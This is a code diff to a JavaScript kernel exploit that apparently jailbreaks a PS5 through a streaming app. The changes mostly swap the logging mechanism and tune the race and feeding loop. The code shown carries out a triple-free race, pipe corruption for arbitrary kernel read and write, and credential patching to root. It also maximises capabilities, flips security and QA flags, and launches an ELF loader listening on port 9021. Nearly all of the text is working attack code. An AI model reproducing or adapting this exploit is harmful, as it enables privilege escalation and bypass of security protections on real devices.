@@ -1687,41 +1687,6 @@ function spawn_thread(fake_rop_race1_array) {
             };
         }
 
-        const ulog_port = 8089;
-        let _log_socket_fd = null;
-        _log_socket_fd = connectToServer(ulog_port); // uncomment to log to a raw socket instead of a websocket to avoid messages getting truncated randomly when there is a crash
-        let _log_socket_buf = null;
-        const _LOG_SOCKET_MAXLEN = 4096;
-
-        function ulog(msg) {
-            const _t = new Date(); const _ts = _t.toTimeString().slice(0,8) + '.' + String(_t.getMilliseconds()).padStart(3,'0');
-            let message = "[p2jb " + _ts + "] " + String(msg);
-
-            if (_log_socket_fd !== null && typeof syscall !== 'undefined') {
-                try {
-                    if (!_log_socket_buf) {
-                        _log_socket_buf = malloc(_LOG_SOCKET_MAXLEN);
-                    }
-                    const line = message + '\n';
-                    const len = Math.min(line.length, _LOG_SOCKET_MAXLEN);
-                    for (let i = 0; i < len; i++) {
-                        write8_uncompressed(_log_socket_buf + BigInt(i), line.charCodeAt(i) & 0xFF);
-                    }
-                    let sent = 0;
-                    while (sent < len) {
-                        const n = syscall(SYSCALL.write, _log_socket_fd, _log_socket_buf + BigInt(sent), BigInt(len - sent));
-                        const nv = Number(n);
-                        if (nv <= 0) break;
-                        sent += nv;
-                    }
-                } catch (e) {
-                    logger.log("ulog fail: " + e);
-                 }
-            } else {
-                logger.log(message);
-                logger.flush()
-            }
-        }
 
         let saved_fpu_ctrl = 0;
         let saved_mxcsr = 0;
@@ -2057,14 +2022,9 @@ function spawn_thread(fake_rop_race1_array) {
             emit(g.get( 'mov_qword_ptr_rdi_rax' ));
 
             emit(g.get ( 'pop_rsp' ));
-            const PIVOT = idx; emit(at(LOOP_START));
+            emit(at(LOOP_START));
 
-            const EXIT = idx;
-            emit(g.get ( 'pop_rax' )); emit(SYSCALL.thr_exit);
-            emit(g.get ( 'pop_rdi' )); emit(0n);
-            emit(syscall_wrapper);
-
-            return { entry, pivotAddr: at(PIVOT), exitAddr: at(EXIT) };
+            return { entry };
         }
 
         function make_state() {
@@ -2353,7 +2313,7 @@ function spawn_thread(fake_rop_race1_array) {
             const EXIT_MARK = 0xDEADn;
             const LEAK_UNROLL = 4096;
             const U = BigInt(LEAK_UNROLL);
-            const LEAK_CORES = [0, 1, 2, 3];
+            const LEAK_CORES = [0, 1];
             const NW = LEAK_CORES.length;
             const FEED_CHUNK = 4096;
 
@@ -2383,11 +2343,40 @@ function spawn_thread(fake_rop_race1_array) {
             const FEED_CHUNK_BIG = BigInt(FEED_CHUNK);
             for (const lw of lws) {
                 lw.wfd_big = BigInt(lw.wfd);
+                lw.rfd_big = BigInt(lw.rfd);
                 lw.normal_n = Number(lw.normal);
                 lw.queued_n = 0;
             }
+            // Pre-allocate timespec for the per-iteration sleep. Done before the cache
+            // reset so malloc's internal call_rop uses whatever depth was active; the
+            // reset clears that immediately after.
+            const _sleep_ts = malloc(16);
+            write64_uncompressed(_sleep_ts,      30n);          // tv_sec  = 30
+            write64_uncompressed(_sleep_ts + 8n, 0n);           // tv_nsec = 0
+            const _fionread_buf = malloc(4);
+
+            // Enable rbp caching only for the feeding loop — all call_rop invocations
+            // here are at the same depth (feeding → syscall → call_rop), so a single
+            // cached rbp is valid. Outside this loop call_rop recomputes on every call.
+            _cr_enable_caching();
+
+            // GC sentinel: fake_rw[21]'s resting value only changes permanently when major (compacting) GC moves fake_victim
+            const _gc_sentinel = fake_rw[21];
+
+            let feed_verbose = true;
             let all_fed = false;
+            let _feed_iter = 0;
+            let _gc_detected = false;
             while (!all_fed) {
+                // GC detector
+                if (fake_rw[21] !== _gc_sentinel) {
+                    logger.log("GC DETECTED: fake_rw[21] changed 0x" +
+                        _gc_sentinel.toString(16) + " -> 0x" + fake_rw[21].toString(16) + " (OOB primitives likely broken)");
+                    logger.flush();
+                    _gc_detected = true;
+                    break;
+                }
+
                 all_fed = true;
                 for (const lw of lws) {
                     if (lw.queued_n < lw.normal_n) {
@@ -2398,9 +2387,37 @@ function spawn_thread(fake_rop_race1_array) {
                         if (n > 0n && n <= FEED_CHUNK_BIG) lw.queued_n += Number(n);
                     }
                 }
-                nanosleep_ms(500);
+
+                // Progress log every 20 iters (10min at 30s/iter). logger.log is WebSocket — no call_rop, no OOB, safe at any call depth.
+                if (feed_verbose && (_feed_iter % 20) === 0) {
+                    let _tq = 0, _tt = 0;
+                    for (const lw of lws) { _tq += lw.queued_n; _tt += lw.normal_n; }
+                    const _pct = Math.floor(_tq / _tt * 100);
+                    let _per = "";
+                    for (let _w = 0; _w < lws.length; _w++) {
+                        syscall(SYSCALL.ioctl, lws[_w].rfd_big, 0x4004667fn, _fionread_buf);
+                        const _qdepth = Number(read32_uncompressed(_fionread_buf));
+                        _per += " w" + _w + ":" + lws[_w].queued_n + "/" + lws[_w].normal_n + "(d:" + _qdepth + ")";
+                    }
+                    logger.log("feed " + _pct + "% (" + _tq + "/" + _tt + " blks)" + _per);
+                }
+                _feed_iter++;
+
+                // Direct nanosleep at the same call depth as the write syscalls above.
+                syscall(SYSCALL.nanosleep, _sleep_ts, 0n);
             }
-            ulog("after feeding ");
+            _cr_disable_caching();
+            if (_gc_detected) {
+                // Throw to unwind cleanly — no OOB after this point.
+                // The uncaught throw propagates to the nrdp event loop idle state,
+                // at which point nrdp's I/O thread flushes the WebSocket queue.
+                logger.log("GC during feeding — aborting");
+                logger.flush();
+                throw new Error("GC during feeding — aborting");
+            }
+            if (feed_verbose) {
+                logger.log("fully fed, waiting for workers to finish");
+            }
 
             for (const lw of lws) {
                 while (true) {
@@ -2427,9 +2444,11 @@ function spawn_thread(fake_rop_race1_array) {
                 if (fd === 0xffffffffffffffffn) fail("free-fd creation failed at i=" + i);
                 S.free_fds.push(Number(fd));
             }
+            if (feed_verbose) {
+                logger.log("feeding complete, stage 0 in 10s");
+            }
             syscall(SYSCALL.setuid, 1n);
             nanosleep_ms(10000);
-            ulog("prepare_fds end");
         }
 
         function free_one_fd(S) {
@@ -2500,14 +2519,14 @@ function spawn_thread(fake_rop_race1_array) {
         }
 
         function stage0(S) {
-            ulog("Stage 0\nTriple-free race");
+            logger.log("Stage 0\nTriple-free race");
 
             if (failcheck_path) {
                 try { write_file(failcheck_path, ""); } catch (_) { }
             }
             for (let attempt = 1; attempt <= TRIPLEFREE_ATTEMPTS; attempt++) {
                 if (attempt_race(S)) {
-                    ulog("stage0: triplets " + S.triplets.join(",") +
+                    logger.log("stage0: triplets " + S.triplets.join(",") +
                         " (attempt " + attempt + "/" + TRIPLEFREE_ATTEMPTS +
                         ")");
                     nanosleep_ms(500);
@@ -2761,7 +2780,7 @@ function spawn_thread(fake_rop_race1_array) {
             }
             if ((proc_filedesc >> 48n) !== 0xFFFFn) fail("stage1: bad filedesc: " + toHex(proc_filedesc));
             S.proc_filedesc = proc_filedesc;
-            ulog("stage1: proc_filedesc=" + toHex(proc_filedesc));
+            logger.log("stage1: proc_filedesc=" + toHex(proc_filedesc));
 
             for (let k = 0; k < 3; k++) {
                 S.triplets[1] = find_triplet(S, S.triplets[0], S.triplets[2], 50000);
@@ -2773,7 +2792,7 @@ function spawn_thread(fake_rop_race1_array) {
 
         function stage2(S) {
             send_notification("Stage 2\nLeak pipe data pointers");
-            ulog("stage2: leaking pipe pointers...");
+            logger.log("stage2: leaking pipe pointers...");
             for (let attempt = 0; attempt < 5; attempt++) {
                 repair_triplets(S); nanosleep_ms(100);
                 const fdescenttbl = kslow64(S, S.proc_filedesc + S.OFF.FILEDESC_OFILES);
@@ -2797,7 +2816,7 @@ function spawn_thread(fake_rop_race1_array) {
                 if (!S.victim_pipe_data) continue;
 
                 if (S.master_pipe_data !== S.victim_pipe_data) {
-                    ulog("stage2: master_pipe=" + toHex(S.master_pipe_data) +
+                    logger.log("stage2: master_pipe=" + toHex(S.master_pipe_data) +
                         " victim_pipe=" + toHex(S.victim_pipe_data));
                     return;
                 }
@@ -2808,7 +2827,7 @@ function spawn_thread(fake_rop_race1_array) {
 
         function stage3(S) {
             send_notification("Stage 3\nPipe corruption -> fast kernel R/W");
-            ulog("stage3: corrupting pipe buffer...");
+            logger.log("stage3: corrupting pipe buffer...");
 
             const pipe_overwrite = malloc(24);
             write32_uncompressed(pipe_overwrite, 0n);
@@ -2861,7 +2880,7 @@ function spawn_thread(fake_rop_race1_array) {
                 kwrite_slow(S, S.master_pipe_data, pipe_overwrite, 24);
             }
             if (!verified) fail("stage3: verify failed");
-            ulog("stage3: kernel r/w achieved");
+            logger.log("stage3: kernel r/w achieved");
 
             stage3_cleanup(S);
         }
@@ -2912,7 +2931,7 @@ function spawn_thread(fake_rop_race1_array) {
             write16_uncompressed(S.rt_params + 2n, 0n);
             syscall(SYSCALL.rtprio_thread, RTP_SET, 0n, S.rt_params);
 
-            ulog("stage3b: race cleanup done");
+            logger.log("stage3b: race cleanup done");
 
             nanosleep_ms(3000);
         }
@@ -2922,19 +2941,19 @@ function spawn_thread(fake_rop_race1_array) {
             try {
                 const B = S.proc_ucred;
                 if (B === 0n || (B >> 48n) !== 0xFFFFn) {
-                    ulog("stage_d6: proc_ucred invalid, skip");
+                    logger.log("stage_d6: proc_ucred invalid, skip");
                     return;
                 }
 
                 const main_thread = S.kread64(S.curproc + 0x10n);
                 if (main_thread === 0n || (main_thread >> 48n) !== 0xFFFFn) {
-                    ulog("stage_d6: p_threads empty, skip");
+                    logger.log("stage_d6: p_threads empty, skip");
                     return;
                 }
 
                 const bp = S.kread64(main_thread + 0x08n);
                 if (bp !== S.curproc) {
-                    ulog("stage_d6: td_proc backptr mismatch (" + toHex(bp) +
+                    logger.log("stage_d6: td_proc backptr mismatch (" + toHex(bp) +
                         " vs " + toHex(S.curproc) + "), skip");
                     return;
                 }
@@ -2942,7 +2961,7 @@ function spawn_thread(fake_rop_race1_array) {
                 const next_thread = S.kread64(main_thread + 0x10n);
                 if (next_thread === 0n || (next_thread >> 48n) !== 0xFFFFn ||
                     next_thread === main_thread) {
-                    ulog("stage_d6: no 2nd thread for cross-validation, skip");
+                    logger.log("stage_d6: no 2nd thread for cross-validation, skip");
                     return;
                 }
                 const candidates = [];
@@ -2955,16 +2974,16 @@ function spawn_thread(fake_rop_race1_array) {
                     candidates.push(off);
                 }
                 if (candidates.length === 0) {
-                    ulog("stage_d6: td_ucred offset not found, skip");
+                    logger.log("stage_d6: td_ucred offset not found, skip");
                     return;
                 }
                 if (candidates.length > 1) {
-                    ulog("stage_d6: td_ucred offset ambiguous (" +
+                    logger.log("stage_d6: td_ucred offset ambiguous (" +
                         candidates.length + " candidates), skip");
                     return;
                 }
                 const td_ucred_off = candidates[0];
-                ulog("stage_d6: td_ucred at +" + toHex(td_ucred_off) +
+                logger.log("stage_d6: td_ucred at +" + toHex(td_ucred_off) +
                     " (1 cand, validated)");
 
                 let td = main_thread;
@@ -2974,7 +2993,7 @@ function spawn_thread(fake_rop_race1_array) {
                     walked++;
 
                     if (S.kread64(td + 0x08n) !== S.curproc) {
-                        ulog("stage_d6: td_proc mismatch at thread " +
+                        logger.log("stage_d6: td_proc mismatch at thread " +
                             toHex(td) + ", abort walk");
                         break;
                     }
@@ -2985,7 +3004,7 @@ function spawn_thread(fake_rop_race1_array) {
                     }
                     td = S.kread64(td + 0x10n);
                 }
-                ulog("stage_d6: walked " + walked + " threads, patched " +
+                logger.log("stage_d6: walked " + walked + " threads, patched " +
                     patched + " stale td_ucred");
 
                 if (patched > 0) {
@@ -2993,11 +3012,11 @@ function spawn_thread(fake_rop_race1_array) {
                     const old_ref = S.kread32(B);
                     const new_ref = old_ref + BigInt(patched);
                     S.kwrite32(B, new_ref);
-                    ulog("stage_d6: cr_ref(B) " + toHex(old_ref) +
+                    logger.log("stage_d6: cr_ref(B) " + toHex(old_ref) +
                         " -> " + toHex(new_ref) + " (+" + patched + ")");
                 }
             } catch (e) {
-                try { ulog("stage_d6: exception: " + e.message + " - skipped"); }
+                try { logger.log("stage_d6: exception: " + e.message + " - skipped"); }
                 catch (_) { }
             }
         }
@@ -3028,7 +3047,7 @@ function spawn_thread(fake_rop_race1_array) {
             S.curproc = curproc;
             S.proc_ucred = S.kread64(curproc + S.OFF.PROC_UCRED);
             S.proc_fd = S.kread64(curproc + S.OFF.PROC_FD);
-            ulog("stage4: curproc=" + toHex(curproc) + " fd=" + toHex(S.proc_fd));
+            logger.log("stage4: curproc=" + toHex(curproc) + " fd=" + toHex(S.proc_fd));
 
             force_td_ucred_migrate(S);
 
@@ -3053,7 +3072,7 @@ function spawn_thread(fake_rop_race1_array) {
                 fail("stage4: rootvnode not found");
             }
             S.rootvnode = rootvnode;
-            ulog("stage4: rootvnode=" + toHex(rootvnode));
+            logger.log("stage4: rootvnode=" + toHex(rootvnode));
         }
 
         function stage5(S) {
@@ -3075,7 +3094,7 @@ function spawn_thread(fake_rop_race1_array) {
             if (S.kread32(S.proc_ucred + S.OFF.UCRED_CR_UID) !== 0n) {
                 fail("stage5: jailbreak verify failed");
             }
-            ulog("stage5: jailbreak ok");
+            logger.log("stage5: jailbreak ok");
         }
 
         function stage6(S) {
@@ -3092,25 +3111,25 @@ function spawn_thread(fake_rop_race1_array) {
             }
             if (allproc === 0n) {
                 S.data_base_ok = false;
-                ulog("stage6: allproc not found - debug menu + elf " +
+                logger.log("stage6: allproc not found - debug menu + elf " +
                     "loader skipped (jailbreak is done)");
                 return;
             }
             const data_base = allproc - S.OFF.DATA_BASE_ALLPROC;
             S.data_base = data_base;
-            ulog("stage6: allproc=" + toHex(allproc) +
+            logger.log("stage6: allproc=" + toHex(allproc) +
                 " data_base=" + toHex(data_base));
 
             let data_base_ok = true;
             const first_proc = S.kread64(allproc);
             const first_proc_ok = (first_proc >> 48n) === 0xFFFFn;
-            ulog("stage6: data_base check - *allproc=" + toHex(first_proc) +
+            logger.log("stage6: data_base check - *allproc=" + toHex(first_proc) +
                 (first_proc_ok ? "  (kptr OK)" : "  (BAD - not a kptr)"));
             if (!first_proc_ok) data_base_ok = false;
             if (S.OFF.DATA_BASE_ROOTVNODE) {
                 const rv_off = S.kread64(data_base + S.OFF.DATA_BASE_ROOTVNODE);
                 const rv_ok = (rv_off === S.rootvnode);
-                ulog("stage6: data_base check - rootvnode via offset=" +
+                logger.log("stage6: data_base check - rootvnode via offset=" +
                     toHex(rv_off) + " vs stage4 found=" + toHex(S.rootvnode) +
                     (rv_ok ? "  => data_base CORRECT"
                         : "  => MISMATCH - data_base / 11.60 offsets are WRONG"));
@@ -3118,10 +3137,10 @@ function spawn_thread(fake_rop_race1_array) {
             }
 
             if (typeof is_jailbroken === "function")
-                ulog("stage6: is_jailbroken() = " + is_jailbroken());
+                logger.log("stage6: is_jailbroken() = " + is_jailbroken());
             S.data_base_ok = data_base_ok;
             if (!data_base_ok) {
-                ulog("stage6: data_base check FAILED - skipping the debug " +
+                logger.log("stage6: data_base check FAILED - skipping the debug " +
                     "menu and the elf loader. The jailbreak is complete.");
                 return;
             }
@@ -3129,7 +3148,7 @@ function spawn_thread(fake_rop_race1_array) {
             if (ENABLE_DEBUG_MENU) {
                 stage_debug_menu(S);
             } else {
-                ulog("stage6: debug menu DISABLED (ENABLE_DEBUG_MENU=false)");
+                logger.log("stage6: debug menu DISABLED (ENABLE_DEBUG_MENU=false)");
             }
         }
 
@@ -3137,12 +3156,12 @@ function spawn_thread(fake_rop_race1_array) {
             try {
                 if (typeof gpu === "undefined" || typeof kernel === "undefined" ||
                     typeof update_kernel_offsets !== "function") {
-                    ulog("stage_debug: framework gpu/kernel/update_kernel_offsets " +
+                    logger.log("stage_debug: framework gpu/kernel/update_kernel_offsets " +
                         "not in scope - skipped");
                     return;
                 }
                 if (!S.data_base || !S.curproc) {
-                    ulog("stage_debug: data_base/curproc missing - skipped");
+                    logger.log("stage_debug: data_base/curproc missing - skipped");
                     return;
                 }
 
@@ -3162,7 +3181,7 @@ function spawn_thread(fake_rop_race1_array) {
                 const cr3 = S.kread64(pmap_store + S.OFF.PMAP_CR3);
                 kernel.addr.kernel_cr3 = cr3;
                 kernel.addr.dmap_base = pml4 - cr3;
-                ulog("stage_debug: cr3=" + toHex(cr3) +
+                logger.log("stage_debug: cr3=" + toHex(cr3) +
                     " dmap_base=" + toHex(kernel.addr.dmap_base));
 
                 if (kernel_offset.SIZEOF_GVMSPACE === undefined) kernel_offset.SIZEOF_GVMSPACE = 0x100n;
@@ -3171,48 +3190,48 @@ function spawn_thread(fake_rop_race1_array) {
                 if (kernel_offset.GVMSPACE_PAGE_DIR_VA === undefined) kernel_offset.GVMSPACE_PAGE_DIR_VA = 0x38n;
 
                 update_kernel_offsets();
-                ulog("stage_debug: VMSPACE_VM_PMAP=" +
+                logger.log("stage_debug: VMSPACE_VM_PMAP=" +
                     toHex(kernel_offset.VMSPACE_VM_PMAP) + " VM_VMID=" +
                     toHex(kernel_offset.VMSPACE_VM_VMID));
 
                 gpu.setup();
-                ulog("stage_debug: gpu.setup() ok");
+                logger.log("stage_debug: gpu.setup() ok");
 
                 const security_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_SECURITY_FLAGS;
                 const target_id_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_TARGET_ID;
                 const qa_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_QA_FLAGS;
                 const utoken_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_UTOKEN_FLAGS;
 
-                ulog("stage_debug: setting security flags");
+                logger.log("stage_debug: setting security flags");
                 const security_flags = kernel.read_dword(security_flags_addr);
-                ulog("  before: " + toHex(security_flags));
+                logger.log("  before: " + toHex(security_flags));
                 gpu.write_dword(security_flags_addr, security_flags | 0x14n);
                 const security_flags_after = kernel.read_dword(security_flags_addr);
-                ulog("  after:  " + toHex(security_flags_after));
+                logger.log("  after:  " + toHex(security_flags_after));
 
-                ulog("stage_debug: setting targetid");
+                logger.log("stage_debug: setting targetid");
                 const target_id_before = kernel.read_byte(target_id_flags_addr);
-                ulog("  before: " + toHex(target_id_before));
+                logger.log("  before: " + toHex(target_id_before));
                 gpu.write_byte(target_id_flags_addr, 0x82n);
                 const target_id_after = kernel.read_byte(target_id_flags_addr);
-                ulog("  after:  " + toHex(target_id_after));
+                logger.log("  after:  " + toHex(target_id_after));
 
-                ulog("stage_debug: setting qa flags and utoken flags");
+                logger.log("stage_debug: setting qa flags and utoken flags");
                 const qa_flags = kernel.read_dword(qa_flags_addr);
-                ulog("  qa_flags before: " + toHex(qa_flags));
+                logger.log("  qa_flags before: " + toHex(qa_flags));
                 gpu.write_dword(qa_flags_addr, qa_flags | 0x10300n);
                 const qa_flags_after = kernel.read_dword(qa_flags_addr);
-                ulog("  qa_flags after:  " + toHex(qa_flags_after));
+                logger.log("  qa_flags after:  " + toHex(qa_flags_after));
 
                 const utoken_flags = kernel.read_byte(utoken_flags_addr);
-                ulog("  utoken_flags before: " + toHex(utoken_flags));
+                logger.log("  utoken_flags before: " + toHex(utoken_flags));
                 gpu.write_byte(utoken_flags_addr, utoken_flags | 0x1n);
                 const utoken_flags_after = kernel.read_byte(utoken_flags_addr);
-                ulog("  utoken_flags after:  " + toHex(utoken_flags_after));
+                logger.log("  utoken_flags after:  " + toHex(utoken_flags_after));
 
-                ulog("stage_debug: debug menu enabled");
+                logger.log("stage_debug: debug menu enabled");
             } catch (e) {
-                ulog("stage_debug: failed: " + e.message +
+                logger.log("stage_debug: failed: " + e.message +
                     " (jailbreak unaffected)");
             }
         }
@@ -3224,22 +3243,22 @@ function spawn_thread(fake_rop_race1_array) {
             S.kwrite64(S.proc_ucred + S.OFF.UCRED_CR_SCECAPS0, 0xFFFFFFFFFFFFFFFFn);
             S.kwrite64(S.proc_ucred + S.OFF.UCRED_CR_SCECAPS1, 0xFFFFFFFFFFFFFFFFn);
 
-            ulog("stage7: jailbreak complete; authid+caps maximized");
+            logger.log("stage7: jailbreak complete; authid+caps maximized");
             send_notification(p2jb_version + "\nFW=" + FW_VERSION + "\nJailbroken");
 
-            ulog("stage7: 'Jailbroken' notification sent -> stage_load_elf");
+            logger.log("stage7: 'Jailbroken' notification sent -> stage_load_elf");
 
         }
 
         function stage_load_elf(S) {
 
-            ulog("stage_elfldr: entered");
+            logger.log("stage_elfldr: entered");
             if (!LAUNCH_ELF_LOADER) {
-                ulog("stage_elfldr: LAUNCH_ELF_LOADER=false - skipped");
+                logger.log("stage_elfldr: LAUNCH_ELF_LOADER=false - skipped");
                 return;
             }
             if (!S.data_base_ok) {
-                ulog("stage_elfldr: kernel data_base not resolved/verified " +
+                logger.log("stage_elfldr: kernel data_base not resolved/verified " +
                     "in stage6 - elf loader skipped");
                 send_notification("Stage 7\nelf loader skipped (no data_base)");
                 return;
@@ -3248,13 +3267,13 @@ function spawn_thread(fake_rop_race1_array) {
                 if (typeof elf_parse !== "function" || typeof elf_run !== "function" ||
                     typeof elf_wait_for_exit !== "function" ||
                     typeof ipv6_kernel_rw === "undefined") {
-                    ulog("stage_elfldr: framework elf_parse/elf_run/" +
+                    logger.log("stage_elfldr: framework elf_parse/elf_run/" +
                         "elf_wait_for_exit/ipv6_kernel_rw not in scope - skipped");
                     send_notification("Stage 7\nelf loader unavailable - skipped");
                     return;
                 }
 
-                ulog("stage_elfldr: scanning /mnt/usb0..7 for elfldr...");
+                logger.log("stage_elfldr: scanning /mnt/usb0..7 for elfldr...");
                 const usb_names = ["elfldr_1320.elf", "elfldr.elf"];
                 let elf_path = null;
                 for (let u = 0; u < 8 && !elf_path; u++) {
@@ -3264,16 +3283,16 @@ function spawn_thread(fake_rop_race1_array) {
                     }
                 }
                 if (!elf_path) {
-                    ulog("stage_elfldr: elfldr not found on /mnt/usb0../usb7");
+                    logger.log("stage_elfldr: elfldr not found on /mnt/usb0../usb7");
                     send_notification("Stage 7\nelfldr_1320.elf NOT FOUND on USB\n" +
                         "(plug a FAT32/exFAT USB with elfldr_1320.elf)");
                     return;
                 }
-                ulog("stage_elfldr: found " + elf_path);
+                logger.log("stage_elfldr: found " + elf_path);
 
                 ipv6_kernel_rw.init(S.fd_ofiles, S.kread64, S.kwrite64);
                 kernel.addr.data_base = S.data_base;
-                ulog("stage_elfldr: ipv6_kernel_rw built (master_sock=" +
+                logger.log("stage_elfldr: ipv6_kernel_rw built (master_sock=" +
                     ipv6_kernel_rw.data.master_sock + " victim_sock=" +
                     ipv6_kernel_rw.data.victim_sock + ")");
 
@@ -3296,25 +3315,25 @@ function spawn_thread(fake_rop_race1_array) {
                 };
                 pin_pipe_fd(ipv6_kernel_rw.data.pipe_read_fd);
                 pin_pipe_fd(ipv6_kernel_rw.data.pipe_write_fd);
-                ulog("stage_elfldr: handoff pipe + sockets pinned");
+                logger.log("stage_elfldr: handoff pipe + sockets pinned");
 
                 const elf_data = read_file(elf_path);
-                ulog("stage_elfldr: read " + elf_data.length +
+                logger.log("stage_elfldr: read " + elf_data.length +
                     " bytes; parsing...");
                 const entry = elf_parse(elf_data);
-                ulog("stage_elfldr: elf entry=" + toHex(entry) +
+                logger.log("stage_elfldr: elf entry=" + toHex(entry) +
                     "; spawning elfldr...");
                 const { thr_handle, payloadout } = elf_run(entry, elf_path);
 
-                ulog("stage_elfldr: elfldr spawned - joining...");
+                logger.log("stage_elfldr: elfldr spawned - joining...");
                 elf_wait_for_exit(thr_handle, payloadout);
                 const out = read32_uncompressed(payloadout);
-                ulog("stage_elfldr: Thrd join done, payloadout = " + toHex(out));
-                ulog("stage_elfldr: daemon should be listening on :9021");
+                logger.log("stage_elfldr: Thrd join done, payloadout = " + toHex(out));
+                logger.log("stage_elfldr: daemon should be listening on :9021");
                 send_notification("Stage 7\nelfldr running - send your ELF to\n" +
                     "<ps5-ip>:9021  (e.g. BD-UN-JB unpatcher)");
             } catch (e) {
-                ulog("stage_elfldr: failed: " + e.message);
+                logger.log("stage_elfldr: failed: " + e.message);
                 send_notification("Stage 7\nelfldr failed: " + e.message +
                     "\n(jailbreak still complete)");
             }
@@ -3338,7 +3357,7 @@ function spawn_thread(fake_rop_race1_array) {
 
         FW_VERSION = get_fwversion();
 
-        ulog(p2jb_version +" FW: " + FW_VERSION);
+        logger.log(p2jb_version +" FW: " + FW_VERSION);
 
         ensure_kernel_offset();
 
@@ -3351,7 +3370,7 @@ function spawn_thread(fake_rop_race1_array) {
         setup_uio_buffers(S);
         setup_pipes_kernrw(S);
 
-        ulog("pipes master=" + S.master_rfd + "," + S.master_wfd +
+        logger.log("pipes master=" + S.master_rfd + "," + S.master_wfd +
             " victim=" + S.victim_rfd + "," + S.victim_wfd);
 
         /*const MAX_MASTER_RFD = 34;
@@ -3362,12 +3381,12 @@ function spawn_thread(fake_rop_race1_array) {
                 "restart YouTube, wait longer, retry. Kernel UNTOUCHED.");
         }*/
 
-        ulog("spawning workers")
+        logger.log("spawning workers")
         setup_workers(S);
         setup_ipv6_spray(S);
         apply_main_thread_pinning(S);
 
-        ulog("host OK - starting ~40 min leak; no further log output " +
+        logger.log("host OK - starting ~40 min leak; no further log output " +
             "until stage 0 (this is normal, do not interrupt)");
 
         prepare_fds(S);
@@ -3381,6 +3400,7 @@ function spawn_thread(fake_rop_race1_array) {
                 stage3(S);
                 s123_ok = true;
             } catch (e) {
+                logger.log("stages 1-3 attempt " + r + "/8 failed: " + e.message);
                 if (r < 8) {
                     try { repair_triplets(S); } catch (_) { }
                     nanosleep_ms(500);
@@ -3396,10 +3416,10 @@ function spawn_thread(fake_rop_race1_array) {
         stage7(S);
         stage_load_elf(S);
 
-        ulog("=== p2jb complete ===");
+        logger.log("=== p2jb complete ===");
 
     } catch (e) {
-        try { log("p2jb FATAL: " + e.message); } catch (_) { }
+        try { logger.log("p2jb FATAL: " + e.message); } catch (_) { }
         try { send_notification("p2jb FAILED: " + e.message); } catch (_) { }
     }
 })();
